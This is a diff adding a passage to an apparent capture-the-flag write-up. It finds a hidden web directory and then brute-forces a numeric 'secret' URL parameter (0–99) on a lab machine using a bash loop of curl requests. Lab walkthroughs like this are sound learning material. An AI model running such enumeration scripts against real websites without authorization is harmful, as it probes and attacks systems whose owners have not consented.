@@ -42,5 +42,56 @@
 
 # ![5](images/hexedit.jpg?raw=true "hexed")
 
+**Opening our image now, we can see a font which tells us a hidden dir exists on our web server**
+
+``xdg-open thm.jpg``
+
+# ![6](images/hiddendir.jpg?raw=true "hidden")
+
++ **Let's take a look into that directory and see what's going on**
+
+# ![7](images/webhid.jpg?raw=true "webbed")
+
+**It seems like our mad friend wants to guess his secret .. But since i'm not a good guesser, let's take a look into the source code of the page**
+
+# ![8](images/guess.jpg?raw=true "secret")
+
+**He left some unwanted text inside. We know now, that the secret is between 0 and 99, but in the same time, looking into the page we see that there was already a secret entered. Maybe it's a parameter of the page we could enter; let's go on:**
+
+``http://10.10.94.80/th1s_1s_h1dd3n/?secret=2``
+
+# ![9](images/secret.jpg?raw=true "secret")
+
+**Our secret seems to be entered and read inside the page, so let's go ahead and create a mini brute-force script to check 100 possible variants.**
+
++ **I'm gonna use curl to get my requests and page data and i will write a shell script**
+
+```
+#!/bin/bash
+
+for i in {0..99}
+do
+        # modify the ip address below
+        curl --silent http://10.10.94.80/th1s_1s_h1dd3n/?secret=$i | grep right >> /dev/null
+        
+        if [ $? -eq 0 ]
+        then
+                echo "$i is our SECRET page"
+                curl --silent http://10.10.94.80/th1s_1s_h1dd3n/?secret=$i
+                break;
+        else
+                echo "Secret $i is wrong"
+        fi
+done
+
+```
+
+**Let's make executable too and let's run it**
+
+``chmod a+x secret_guess.sh``
+
+``./secret_guess.sh``
+
+# ![10](images/secrfound.jpg?raw=true "secretf")
 
 
